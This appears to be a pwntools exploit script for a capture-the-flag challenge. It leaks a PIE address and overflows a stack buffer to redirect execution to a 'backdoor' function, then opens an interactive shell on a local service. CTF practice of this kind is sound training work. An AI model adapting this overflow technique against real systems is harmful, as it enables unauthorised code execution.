from pwn import *
context(os='linux',arch='amd64')
#context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

LOCAL = False
if LOCAL:
    p=process('./pwn')
else:
    p=remote('127.0.0.1',37591)

p.sendlineafter(b'>',b'1')
p.recvuntil(b'gift:')
opt_addr = int(p.recv(14), 16)
pie = opt_addr - 0x4010
log.success(f'PIE base address: {hex(pie)}')
backdoor = pie + 0x1251

p.sendlineafter(b'>',b'2')
payload1 = b'a'*0x20 + b'xdulaker'
p.sendafter(b'name?!\n', payload1)

p.sendlineafter(b'>',b'3')
payload2 = b'a'*0x38 + p64(backdoor)
p.sendafter(b"welcome,xdulaker\n", payload2)
p.interactive()